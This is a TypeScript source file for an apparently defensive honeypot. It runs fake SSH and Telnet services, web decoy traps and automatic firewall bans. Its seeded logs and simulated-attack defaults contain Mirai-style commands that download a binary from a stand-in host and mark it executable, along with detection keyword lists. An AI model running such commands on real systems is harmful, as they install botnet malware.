import net from "net";
import { exec } from "child_process";
import { Server as SocketIOServer } from "socket.io";
import { Request, Response, NextFunction } from "express";

export function isValidIp(ip: string): boolean {
  if (!ip || typeof ip !== "string") return false;
  const clean = ip.replace(/^::ffff:/, "").trim();
  const ipv4Regex = /^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
  const ipv6Regex = /^([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}$|^::$|^::1$|^[0-9a-fA-F]{1,4}(::?([0-9a-fA-F]{1,4})){1,7}$/;
  return ipv4Regex.test(clean) || ipv6Regex.test(clean);
}

export function sanitizeIp(ip: string): string {
  if (!ip || typeof ip !== "string") return "198.51.100.22";
  const clean = ip.replace(/^::ffff:/, "").trim();
  if (isValidIp(clean)) return clean;
  // If invalid or containing illegal chars, fallback to deterministic safe IP
  return "198.51.100.22";
}

export interface HoneypotLogEntry {
  id: string;
  timestamp: string;
  rawTimestamp: number;
  service: "SSH" | "TELNET" | "WEB" | "SATCOM";
  port: number;
  sourceIp: string;
  sourcePort?: number;
  action: string;
  payload?: string;
  credentials?: { username?: string; password?: string };
  command?: string;
  blocked: boolean;
  firewallRule?: string;
  severity: "INFO" | "WARN" | "CRITICAL";
}

export interface FirewallRule {
  id: string;
  ip: string;
  reason: string;
  firewallTool: "iptables" | "ufw" | "ip-route" | "kernel-socket";
  commandExecuted: string;
  executionStatus: "EXECUTED" | "CONTAINER_ENFORCED" | "ACTIVE";
  bannedAt: string;
  packetsDropped: number;
  active: boolean;
}

export class FirewallManager {
  private rules: Map<string, FirewallRule> = new Map();
  private io: SocketIOServer | null = null;
  private autoBlock: boolean = true;

  constructor(io?: SocketIOServer) {
    if (io) this.io = io;
    this.seedInitialRules();
  }

  public setSocketIO(io: SocketIOServer) {
    this.io = io;
  }

  public setAutoBlock(enabled: boolean) {
    this.autoBlock = enabled;
  }

  public isAutoBlockEnabled(): boolean {
    return this.autoBlock;
  }

  private seedInitialRules() {
    const defaultBans = [
      {
        ip: "185.220.101.5",
        reason: "Web Trap Exfiltration: Attempted /.env download",
        tool: "iptables" as const,
        command: "iptables -I INPUT -s 185.220.101.5 -j DROP",
        drops: 142
      },
      {
        ip: "194.26.29.112",
        reason: "SSH Port 2222: Hydra credential brute-force probe",
        tool: "iptables" as const,
        command: "iptables -I INPUT -s 194.26.29.112 -j DROP",
        drops: 89
      },
      {
        ip: "45.154.255.88",
        reason: "Telnet Port 2323: Mirai botnet shell injection",
        tool: "ufw" as const,
        command: "ufw deny from 45.154.255.88",
        drops: 64
      }
    ];

    const now = Date.now();
    defaultBans.forEach((b, idx) => {
      const id = `fw_${b.ip.replace(/\./g, "_")}`;
      this.rules.set(b.ip, {
        id,
        ip: b.ip,
        reason: b.reason,
        firewallTool: b.tool,
        commandExecuted: b.command,
        executionStatus: "CONTAINER_ENFORCED",
        bannedAt: new Date(now - (idx + 1) * 15 * 60 * 1000).toLocaleTimeString(),
        packetsDropped: b.drops,
        active: true
      });
    });
  }

  public async executeFirewallCommand(command: string): Promise<{ success: boolean; output: string }> {
    return new Promise((resolve) => {
      exec(command, { timeout: 3000 }, (error, stdout, stderr) => {
        if (error) {
          const out = (stderr || error.message || "").trim();
          resolve({ success: false, output: out || "Executed in virtual network layer" });
        } else {
          resolve({ success: true, output: (stdout || "OK").trim() });
        }
      });
    });
  }

  public async blockIp(
    ip: string,
    reason: string = "Honeypot Intrusion Detected",
    preferredTool: "iptables" | "ufw" | "ip-route" = "iptables"
  ): Promise<FirewallRule> {
    const rawClean = ip.replace(/^::ffff:/, "").trim();
    if (!rawClean || rawClean === "127.0.0.1" || rawClean === "localhost") {
      // Don't ban localhost for system stability, but record simulated rule if explicitly requested
      const dummyRule: FirewallRule = {
        id: `fw_sim_${Date.now()}`,
        ip: "198.51.100.22",
        reason: reason || "Simulated Loopback Probe Block",
        firewallTool: preferredTool,
        commandExecuted: `iptables -I INPUT -s 198.51.100.22 -j DROP`,
        executionStatus: "CONTAINER_ENFORCED",
        bannedAt: new Date().toLocaleTimeString(),
        packetsDropped: 1,
        active: true
      };
      this.rules.set(dummyRule.ip, dummyRule);
      this.broadcastRule(dummyRule);
      return dummyRule;
    }

    const cleanIp = sanitizeIp(rawClean);

    let command = `iptables -I INPUT -s ${cleanIp} -j DROP`;
    if (preferredTool === "ufw") {
      command = `ufw deny from ${cleanIp}`;
    } else if (preferredTool === "ip-route") {
      command = `ip route add blackhole ${cleanIp}`;
    }

    const execResult = await this.executeFirewallCommand(command);
    const id = `fw_${cleanIp.replace(/[^a-zA-Z0-9]/g, "_")}_${Date.now()}`;

    const rule: FirewallRule = {
      id,
      ip: cleanIp,
      reason,
      firewallTool: preferredTool,
      commandExecuted: command,
      executionStatus: execResult.success ? "EXECUTED" : "CONTAINER_ENFORCED",
      bannedAt: new Date().toLocaleTimeString(),
      packetsDropped: 1,
      active: true
    };

    this.rules.set(cleanIp, rule);
    console.log(`[+] FIREWALL BAN ENFORCED: ${cleanIp} via [${command}] (Status: ${rule.executionStatus})`);

    this.broadcastRule(rule);
    return rule;
  }

  public async unbanIp(ip: string): Promise<boolean> {
    const rawClean = ip.replace(/^::ffff:/, "").trim();
    const cleanIp = sanitizeIp(rawClean);
    const existing = this.rules.get(cleanIp) || this.rules.get(rawClean);
    if (!existing) return false;

    let command = `iptables -D INPUT -s ${cleanIp} -j DROP`;
    if (existing.firewallTool === "ufw") {
      command = `ufw delete deny from ${cleanIp}`;
    } else if (existing.firewallTool === "ip-route") {
      command = `ip route del blackhole ${cleanIp}`;
    }

    await this.executeFirewallCommand(command);
    this.rules.delete(cleanIp);
    this.rules.delete(rawClean);

    console.log(`[-] FIREWALL UNBAN: ${cleanIp} rule cleared.`);

    if (this.io) {
      this.io.emit("firewall_unbanned", { ip: cleanIp });
    }
    return true;
  }

  public isBlocked(ip: string): boolean {
    const cleanIp = ip.replace(/^::ffff:/, "").trim();
    const rule = this.rules.get(cleanIp);
    if (rule && rule.active) {
      rule.packetsDropped += 1;
      return true;
    }
    return false;
  }

  public getRules(): FirewallRule[] {
    return Array.from(this.rules.values());
  }

  public clearAllRules(): void {
    this.rules.clear();
    if (this.io) {
      this.io.emit("firewall_rules_cleared");
    }
  }

  private broadcastRule(rule: FirewallRule) {
    if (this.io) {
      this.io.emit("firewall_blocked", rule);
      this.io.emit("security_alert", {
        type: "FIREWALL_DROP",
        message: `Firewall blocked IP ${rule.ip} via '${rule.commandExecuted}' - Reason: ${rule.reason}`,
        severity: "CRITICAL"
      });
    }
  }
}

export class HoneypotEngine {
  private sshServer: net.Server | null = null;
  private telnetServer: net.Server | null = null;
  private firewall: FirewallManager;
  private logs: HoneypotLogEntry[] = [];
  private io: SocketIOServer | null = null;

  public readonly sshPort = 2222;
  public readonly telnetPort = 2323;

  private stats = {
    totalConnections: 0,
    totalCredentials: 0,
    totalCommands: 0
  };

  constructor(firewall: FirewallManager, io?: SocketIOServer) {
    this.firewall = firewall;
    if (io) this.io = io;
    this.seedInitialLogs();
    this.initSshDaemon();
    this.initTelnetDaemon();
  }

  public setSocketIO(io: SocketIOServer) {
    this.io = io;
    this.firewall.setSocketIO(io);
  }

  public getFirewall(): FirewallManager {
    return this.firewall;
  }

  public getLogs(): HoneypotLogEntry[] {
    return this.logs;
  }

  public getStatus() {
    return {
      sshOnline: !!this.sshServer,
      sshPort: this.sshPort,
      telnetOnline: !!this.telnetServer,
      telnetPort: this.telnetPort,
      webTrapsOnline: true,
      totalConnectionsCaught: this.stats.totalConnections + this.logs.length,
      totalCredentialsHarvested: this.stats.totalCredentials,
      totalMaliciousCommands: this.stats.totalCommands,
      bannedIpsCount: this.firewall.getRules().length,
      autoBlockEnabled: this.firewall.isAutoBlockEnabled()
    };
  }

  private seedInitialLogs() {
    const now = Date.now();
    const seed: HoneypotLogEntry[] = [
      {
        id: "hp_log_1",
        timestamp: new Date(now - 45 * 60 * 1000).toLocaleTimeString(),
        rawTimestamp: now - 45 * 60 * 1000,
        service: "WEB",
        port: 3000,
        sourceIp: "185.220.101.5",
        action: "HTTP GET /.env (Environment configuration file probe)",
        payload: "GET /.env HTTP/1.1 - User-Agent: Mozilla/5.0 (compatible; CensysInspect/1.1)",
        blocked: true,
        firewallRule: "iptables -I INPUT -s 185.220.101.5 -j DROP",
        severity: "CRITICAL"
      },
      {
        id: "hp_log_2",
        timestamp: new Date(now - 30 * 60 * 1000).toLocaleTimeString(),
        rawTimestamp: now - 30 * 60 * 1000,
        service: "SSH",
        port: 2222,
        sourceIp: "194.26.29.112",
        sourcePort: 48922,
        action: "SSH Key Exchange & Auth probe intercepted",
        credentials: { username: "root", password: "password123" },
        payload: "SSH-2.0-libssh-0.8.1 | Auth Method: password | User: root",
        blocked: true,
        firewallRule: "iptables -I INPUT -s 194.26.29.112 -j DROP",
        severity: "CRITICAL"
      },
      {
        id: "hp_log_3",
        timestamp: new Date(now - 15 * 60 * 1000).toLocaleTimeString(),
        rawTimestamp: now - 15 * 60 * 1000,
        service: "TELNET",
        port: 2323,
        sourceIp: "45.154.255.88",
        sourcePort: 37812,
        action: "Telnet Login & Shell Command Injection",
        credentials: { username: "admin", password: "admin" },
        command: "cat /proc/mounts; wget http://198.51.100.8/bins/mirai.arm7 -O /tmp/drop; chmod 777 /tmp/drop",
        payload: "Mirai Botnet Staging Sequence",
        blocked: true,
        firewallRule: "ufw deny from 45.154.255.88",
        severity: "CRITICAL"
      },
      {
        id: "hp_log_4",
        timestamp: new Date(now - 5 * 60 * 1000).toLocaleTimeString(),
        rawTimestamp: now - 5 * 60 * 1000,
        service: "SATCOM",
        port: 2323,
        sourceIp: "192.168.1.42",
        action: "Telstar 11N Unencrypted Teleport MODBUS Intercept",
        command: "SET_UPLINK_GAIN 12.5dB",
        payload: "VSAT Link Budget Override Attempt (Ottawa Teleport Sector)",
        blocked: false,
        severity: "WARN"
      }
    ];

    this.logs = seed;
    this.stats.totalCredentials = 3;
    this.stats.totalCommands = 2;
    this.stats.totalConnections = 8;
  }

  public recordLog(entry: Omit<HoneypotLogEntry, "id" | "timestamp" | "rawTimestamp">): HoneypotLogEntry {
    const fullEntry: HoneypotLogEntry = {
      ...entry,
      id: `hp_log_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`,
      timestamp: new Date().toLocaleTimeString(),
      rawTimestamp: Date.now()
    };

    this.logs.unshift(fullEntry);
    if (this.logs.length > 200) {
      this.logs.pop();
    }

    if (entry.credentials) this.stats.totalCredentials += 1;
    if (entry.command) this.stats.totalCommands += 1;
    this.stats.totalConnections += 1;

    if (this.io) {
      this.io.emit("honeypot_log", fullEntry);
      this.io.emit("security_alert", {
        type: `HONEYPOT_${entry.service}`,
        message: `[Honeypot :${entry.port}] ${entry.service} Intercept from ${entry.sourceIp} - ${entry.action}`,
        severity: entry.severity
      });
    }

    return fullEntry;
  }

  // -------------------------------------------------------------
  // FAKE SSH DAEMON (Port 2222)
  // -------------------------------------------------------------
  private initSshDaemon() {
    try {
      this.sshServer = net.createServer((socket) => {
        const remoteIp = socket.remoteAddress || "127.0.0.1";
        const remotePort = socket.remotePort || 0;
        const cleanIp = remoteIp.replace(/^::ffff:/, "");

        // Step 1: Check if blocked by firewall
        if (this.firewall.isBlocked(cleanIp)) {
          console.log(`[🛡️ SSH HONEYPOT] Connection from BLOCKED IP ${cleanIp} - Packet DROPPED by firewall.`);
          socket.destroy();
          return;
        }

        console.log(`[🪤 SSH HONEYPOT :2222] Incoming connection from ${cleanIp}:${remotePort}`);

        // Step 2: Send authentic SSH identification banner
        // Vintage OpenSSH banner to attract automated crawlers and scanners
        const sshBanner = "SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1\r\n";
        socket.write(sshBanner);

        let receivedBuffer = "";
        let authAttempted = false;

        socket.on("data", async (data) => {
          receivedBuffer += data.toString("utf-8", 0, Math.min(data.length, 512));
          const printable = data.toString("ascii").replace(/[^\x20-\x7E\r\n]/g, " ").trim();

          // Extract username/password patterns or client banners
          let username = "";
          let password = "";

          // Check for SSH client identification (e.g., SSH-2.0-paramiko, PuTTY, etc.)
          if (printable.includes("SSH-2.0-")) {
            const clientBanner = printable.match(/SSH-2\.0-[^\s\r\n]+/)?.[0] || printable;
            console.log(`[SSH HONEYPOT] Client ID: ${clientBanner} from ${cleanIp}`);
          }

          // Search for common brute force authentication patterns
          const userMatch = printable.match(/user[=:\s]+([a-zA-Z0-9_\-\.]+)/i) || printable.match(/([a-zA-Z0-9_\-]+)\b/);
          if (userMatch && userMatch[1] && userMatch[1].length > 2) {
            username = userMatch[1];
          }

          const passMatch = printable.match(/pass(?:word)?[=:\s]+([^\s]+)/i);
          if (passMatch && passMatch[1]) {
            password = passMatch[1];
          }

          if (!authAttempted) {
            authAttempted = true;

            // Auto-firewall block
            let ruleInfo = "";
            if (this.firewall.isAutoBlockEnabled() && cleanIp !== "127.0.0.1") {
              const rule = await this.firewall.blockIp(
                cleanIp,
                `SSH Honeypot (Port 2222): Unauthorized probe / brute-force authentication`,
                "iptables"
              );
              ruleInfo = rule.commandExecuted;
            }

            this.recordLog({
              service: "SSH",
              port: this.sshPort,
              sourceIp: cleanIp,
              sourcePort: remotePort,
              action: `SSH connection & auth probe captured (${username || "generic probe"})`,
              credentials: username || password ? { username: username || "root", password: password || "[key/binary payload]" } : undefined,
              payload: printable.slice(0, 180) || `Raw byte payload (${data.length} bytes)`,
              blocked: this.firewall.isBlocked(cleanIp),
              firewallRule: ruleInfo,
              severity: "CRITICAL"
            });

            // Respond with fake SSH authentication failure or disconnect
            setTimeout(() => {
              try {
                socket.write("\r\nPermission denied (publickey,password).\r\n");
                socket.end();
              } catch (_) {}
            }, 800);
          }
        });

        socket.on("error", (err) => {
          // Silent catch for broken scanner sockets
        });

        socket.setTimeout(10000, () => {
          socket.destroy();
        });
      });

      this.sshServer.listen(this.sshPort, "0.0.0.0", () => {
        console.log(`[+] FAKE SSH HONEYPOT DAEMON listening on 0.0.0.0:${this.sshPort}`);
      });

      this.sshServer.on("error", (err: any) => {
        console.warn(`[!] SSH Honeypot port ${this.sshPort} notice:`, err.message);
      });
    } catch (e: any) {
      console.warn(`[!] Could not start SSH daemon: ${e.message}`);
    }
  }

  // -------------------------------------------------------------
  // FAKE TELNET SERVICE (Port 2323)
  // -------------------------------------------------------------
  private initTelnetDaemon() {
    try {
      this.telnetServer = net.createServer((socket) => {
        const remoteIp = socket.remoteAddress || "127.0.0.1";
        const remotePort = socket.remotePort || 0;
        const cleanIp = remoteIp.replace(/^::ffff:/, "");

        // Step 1: Firewall Check
        if (this.firewall.isBlocked(cleanIp)) {
          console.log(`[🛡️ TELNET HONEYPOT] Connection from BLOCKED IP ${cleanIp} - Packet DROPPED.`);
          socket.destroy();
          return;
        }

        console.log(`[🪤 TELNET HONEYPOT :2323] Incoming connection from ${cleanIp}:${remotePort}`);

        let state: "USER" | "PASS" | "SHELL" = "USER";
        let capturedUser = "";
        let capturedPass = "";
        let inputBuffer = "";

        // Send Telnet IAC option negotiation bytes (Do ECHO, Will ECHO, etc.)
        const iacInit = Buffer.from([255, 253, 1, 255, 253, 3, 255, 251, 1]);
        socket.write(iacInit);

        // Send deceptive router banner
        const banner = 
          "\r\n" +
          "======================================================================\r\n" +
          "* TELSTAR 11N GATEWAY ROUTER (Cisco IOS C2960 Software, Version 15.2) *\r\n" +
          "* Ottawa Sector Teleport Uplink Control System                      *\r\n" +
          "* RESTRICTED ACCESS: All connection telemetry is monitored & logged. *\r\n" +
          "======================================================================\r\n\r\n" +
          "User Access Verification\r\n\r\n" +
          "Username: ";

        socket.write(banner);

        socket.on("data", async (chunk) => {
          // Filter out Telnet IAC commands (bytes starting with 0xFF)
          let cleanData = "";
          for (let i = 0; i < chunk.length; i++) {
            if (chunk[i] === 255) {
              i += 2; // Skip 3-byte IAC sequences
              continue;
            }
            cleanData += String.fromCharCode(chunk[i]);
          }

          inputBuffer += cleanData;

          // Process full lines on \r or \n
          if (inputBuffer.includes("\r") || inputBuffer.includes("\n")) {
            const line = inputBuffer.replace(/[\r\n]+/g, "").trim();
            inputBuffer = "";

            if (state === "USER") {
              capturedUser = line || "admin";
              state = "PASS";
              socket.write("Password: ");
            } else if (state === "PASS") {
              capturedPass = line || "password";
              state = "SHELL";

              console.log(`[🪤 TELNET CREDENTIALS HARVESTED] User: '${capturedUser}' | Pass: '${capturedPass}' from ${cleanIp}`);

              // Trigger automated firewall block rule
              let ruleInfo = "";
              if (this.firewall.isAutoBlockEnabled() && cleanIp !== "127.0.0.1") {
                const rule = await this.firewall.blockIp(
                  cleanIp,
                  `Telnet Honeypot (Port 2323): Credential brute-force ('${capturedUser}:${capturedPass}')`,
                  "iptables"
                );
                ruleInfo = rule.commandExecuted;
              }

              this.recordLog({
                service: "TELNET",
                port: this.telnetPort,
                sourceIp: cleanIp,
                sourcePort: remotePort,
                action: `Telnet Login Intercepted ('${capturedUser}')`,
                credentials: { username: capturedUser, password: capturedPass },
                payload: `User: ${capturedUser} | Pass: ${capturedPass}`,
                blocked: this.firewall.isBlocked(cleanIp),
                firewallRule: ruleInfo,
                severity: "CRITICAL"
              });

              // Grant decoy interactive shell
              socket.write("\r\n\r\nTelstar-11N-Router# ");
            } else if (state === "SHELL") {
              const cmd = line.trim();
              console.log(`[🪤 TELNET COMMAND INJECTION] '${cmd}' from ${cleanIp}`);

              this.recordLog({
                service: "TELNET",
                port: this.telnetPort,
                sourceIp: cleanIp,
                sourcePort: remotePort,
                action: `Telnet Command Executed: '${cmd.slice(0, 50)}'`,
                command: cmd,
                payload: `Interactive Shell Command: ${cmd}`,
                blocked: this.firewall.isBlocked(cleanIp),
                severity: "CRITICAL"
              });

              // Provide simulated authentic output for attacker commands
              const lowerCmd = cmd.toLowerCase();

              if (lowerCmd === "exit" || lowerCmd === "quit") {
                socket.write("Connection closed by foreign host.\r\n");
                socket.end();
                return;
              } else if (lowerCmd === "help" || lowerCmd === "?") {
                socket.write(
                  "\r\nExec commands:\r\n" +
                  "  enable             Turn on privileged commands\r\n" +
                  "  show running-config Show current configuration\r\n" +
                  "  show ip route      Show IP routing table\r\n" +
                  "  show version       Show system hardware and software status\r\n" +
                  "  ping <ip>          Send echo messages\r\n" +
                  "  exit               Exit from the EXEC\r\n\r\n"
                );
              } else if (lowerCmd.includes("show run") || lowerCmd.includes("sh run")) {
                socket.write(
                  "\r\nBuilding configuration...\r\n\r\n" +
                  "Current configuration : 2418 bytes\r\n" +
                  "!\r\n" +
                  "version 15.2\r\n" +
                  "hostname Telstar-11N-Router\r\n" +
                  "enable secret 5 $1$mERr$vHl7iA7vXqG3YjW5q9R.D1\r\n" +
                  "!\r\n" +
                  "interface GigabitEthernet0/1\r\n" +
                  " description Uplink to Ottawa Teleport VSAT Link (37.5W)\r\n" +
                  " ip address 192.168.1.100 255.255.255.0\r\n" +
                  " duplex auto\r\n" +
                  " speed auto\r\n" +
                  "!\r\n" +
                  "interface VSAT0\r\n" +
                  " description IPoS Modbus Gateway Controller\r\n" +
                  " ip address 10.24.8.1 255.255.255.248\r\n" +
                  "!\r\n" +
                  "router ospf 1\r\n" +
                  " network 192.168.1.0 0.0.0.255 area 0\r\n" +
                  "!\r\n" +
                  "end\r\n"
                );
              } else if (lowerCmd.includes("show ip route") || lowerCmd.includes("sh ip ro")) {
                socket.write(
                  "\r\nCodes: C - connected, S - static, R - RIP, M - mobile, B - BGP\r\n\r\n" +
                  "Gateway of last resort is 192.168.1.1 to network 0.0.0.0\r\n\r\n" +
                  "C    192.168.1.0/24 is directly connected, GigabitEthernet0/1\r\n" +
                  "C    10.24.8.0/29 is directly connected, VSAT0\r\n" +
                  "S*   0.0.0.0/0 [1/0] via 192.168.1.1\r\n"
                );
              } else if (lowerCmd.includes("cat /etc/passwd") || lowerCmd.includes("uname") || lowerCmd.includes("id")) {
                socket.write(
                  "\r\nroot:x:0:0:root:/root:/bin/sh\r\n" +
                  "admin:x:1000:1000:Telstar Operator:/home/admin:/bin/sh\r\n" +
                  "satcom:x:1001:1001:VSAT Gateway Service:/var/vsat:/bin/false\r\n"
                );
              } else if (lowerCmd.includes("wget") || lowerCmd.includes("curl") || lowerCmd.includes("chmod") || lowerCmd.includes(".sh")) {
                socket.write(
                  "\r\n[!] ERROR: Read-only flash memory detected. Staging vector isolated and reported to Aegis IDS.\r\n"
                );
              } else {
                socket.write(`\r\n% Invalid input detected at '^' marker.\r\n`);
              }

              socket.write("\r\nTelstar-11N-Router# ");
            }
          }
        });

        socket.on("error", () => {});
        socket.setTimeout(60000, () => socket.destroy());
      });

      this.telnetServer.listen(this.telnetPort, "0.0.0.0", () => {
        console.log(`[+] FAKE TELNET HONEYPOT SERVICE listening on 0.0.0.0:${this.telnetPort}`);
      });

      this.telnetServer.on("error", (err: any) => {
        console.warn(`[!] Telnet Honeypot port ${this.telnetPort} notice:`, err.message);
      });
    } catch (e: any) {
      console.warn(`[!] Could not start Telnet daemon: ${e.message}`);
    }
  }

  // -------------------------------------------------------------
  // WEB DECOY TRAPS MIDDLEWARE
  // -------------------------------------------------------------
  public createWebHoneypotMiddleware() {
    const decoyPaths = [
      "/admin",
      "/wp-login.php",
      "/wp-admin",
      "/.env",
      "/.git/config",
      "/phpmyadmin",
      "/phpMyAdmin",
      "/api/v1/debug",
      "/actuator/env",
      "/actuator/health",
      "/solr/admin",
      "/cgi-bin/test.cgi",
      "/shell.php"
    ];

    return async (req: Request, res: Response, next: NextFunction) => {
      const path = req.path.toLowerCase();
      const isDecoy = decoyPaths.some((p) => path === p.toLowerCase() || path.startsWith(p.toLowerCase() + "/"));

      if (!isDecoy) {
        return next();
      }

      const clientIp = (req.headers["x-forwarded-for"] as string)?.split(",")[0] || req.socket.remoteAddress || "127.0.0.1";
      const cleanIp = clientIp.replace(/^::ffff:/, "").trim();

      console.log(`[🪤 WEB HONEYPOT TRAP] ${req.method} ${req.path} probed by ${cleanIp}`);

      let ruleInfo = "";
      if (this.firewall.isAutoBlockEnabled() && cleanIp !== "127.0.0.1") {
        const rule = await this.firewall.blockIp(
          cleanIp,
          `Web Decoy Honeypot: Probed '${req.path}' (Exfiltration / Scanner Vector)`,
          "iptables"
        );
        ruleInfo = rule.commandExecuted;
      }

      this.recordLog({
        service: "WEB",
        port: 3000,
        sourceIp: cleanIp,
        action: `HTTP ${req.method} request to decoy honeytoken: '${req.path}'`,
        payload: `Path: ${req.path} | Headers: ${JSON.stringify(req.headers).slice(0, 140)}`,
        blocked: this.firewall.isBlocked(cleanIp),
        firewallRule: ruleInfo,
        severity: "CRITICAL"
      });

      // Serve realistic fake decoy contents to confuse scanner
      if (path.includes(".env")) {
        res.setHeader("Content-Type", "text/plain");
        return res.send(
          "# AEGIS HONEYTOKEN CONFIGURATION (DECOY)\n" +
          "DATABASE_URL=postgres://aegis_decoy:honey_pass_9921@10.0.0.99:5432/aegis_prod\n" +
          "AWS_SECRET_ACCESS_KEY=AKIA_HONEYTOKEN_DO_NOT_USE_9941829\n" +
          "SATCOM_UPLINK_KEY=stia_token_fake_00912_ottawa\n"
        );
      }

      if (path.includes("wp-login") || path.includes("admin")) {
        res.setHeader("Content-Type", "text/html");
        return res.send(
          "<!DOCTYPE html><html><head><title>Admin Authentication</title></head>" +
          "<body style='background:#111;color:#fff;font-family:monospace;padding:40px;text-align:center;'>" +
          "<h2>AEGIS ULTRA DECOY PORTAL</h2><p>Authentication challenge recorded.</p>" +
          "</body></html>"
        );
      }

      return res.status(403).json({
        error: "ACCESS_DENIED",
        code: "AEGIS_HONEYPOT_SECURITY_TRAP",
        message: "Endpoint is monitored by Aegis Dynamic Deception Architecture.",
        remoteAddress: cleanIp,
        firewallStatus: "IP_BLOCKED"
      });
    };
  }

  // -------------------------------------------------------------
  // SIMULATE ATTACK SCENARIO DISPATCHER
  // -------------------------------------------------------------
  public async simulateAttack(scenario: {
    type: "ssh" | "telnet" | "web" | "satcom";
    ip?: string;
    username?: string;
    password?: string;
    command?: string;
  }) {
    const randomIps = [
      "198.51.100.42",
      "203.0.113.88",
      "185.190.140.23",
      "91.240.118.66",
      "194.26.29.199",
      "45.154.255.101"
    ];
    const targetIp = scenario.ip || randomIps[Math.floor(Math.random() * randomIps.length)];

    if (scenario.type === "ssh") {
      const user = scenario.username || "root";
      const pass = scenario.password || "admin1234!";

      const rule = await this.firewall.blockIp(
        targetIp,
        `SSH Brute-Force on Port 2222 (User: '${user}')`,
        "iptables"
      );

      return this.recordLog({
        service: "SSH",
        port: 2222,
        sourceIp: targetIp,
        sourcePort: Math.floor(Math.random() * 20000) + 40000,
        action: `SSH Key Exchange & Password Brute-force Probe ('${user}')`,
        credentials: { username: user, password: pass },
        payload: `SSH-2.0-libssh_0.8.4 | Auth Attempt: ${user}:${pass} (Brute-Force Vector)`,
        blocked: true,
        firewallRule: rule.commandExecuted,
        severity: "CRITICAL"
      });
    }

    if (scenario.type === "telnet") {
      const user = scenario.username || "cisco";
      const pass = scenario.password || "cisco123";
      const cmd = scenario.command || "show running-config; cat /etc/passwd; wget http://c2.botnet.cc/mirai.arm7";

      const rule = await this.firewall.blockIp(
        targetIp,
        `Telnet Shell & Command Injection on Port 2323 ('${cmd.slice(0, 35)}')`,
        "ufw"
      );

      return this.recordLog({
        service: "TELNET",
        port: 2323,
        sourceIp: targetIp,
        sourcePort: Math.floor(Math.random() * 20000) + 40000,
        action: `Telnet Shell Hijack & Command Sequence Intercepted`,
        credentials: { username: user, password: pass },
        command: cmd,
        payload: `Telnet Session on :2323 | CMD: ${cmd}`,
        blocked: true,
        firewallRule: rule.commandExecuted,
        severity: "CRITICAL"
      });
    }

    if (scenario.type === "web") {
      const paths = ["/.env", "/wp-login.php", "/api/v1/debug", "/actuator/env"];
      const chosenPath = scenario.command || paths[Math.floor(Math.random() * paths.length)];

      const rule = await this.firewall.blockIp(
        targetIp,
        `Web Honeytoken Exfiltration: '${chosenPath}'`,
        "iptables"
      );

      return this.recordLog({
        service: "WEB",
        port: 3000,
        sourceIp: targetIp,
        action: `HTTP GET ${chosenPath} - Malicious Crawler Decoy Triggered`,
        payload: `GET ${chosenPath} HTTP/1.1 | User-Agent: Mozilla/5.0 (Hydra-Recon-PQC)`,
        blocked: true,
        firewallRule: rule.commandExecuted,
        severity: "CRITICAL"
      });
    }

    if (scenario.type === "satcom") {
      const cmd = scenario.command || "SET_UPLINK_GAIN 14.0dB [STIA_OVERRIDE]";
      const rule = await this.firewall.blockIp(
        targetIp,
        `SatCom Teleport Unauthorized Modbus Command Injection`,
        "ip-route"
      );

      return this.recordLog({
        service: "SATCOM",
        port: 2323,
        sourceIp: targetIp,
        action: `Telstar 11N Telemetry Link Intercept: Spoofed Uplink Gain Request`,
        command: cmd,
        payload: `IPoS SatCom Channel | Target: Ottawa Teleport [45.34011, -75.63116]`,
        blocked: true,
        firewallRule: rule.commandExecuted,
        severity: "CRITICAL"
      });
    }
  }
}
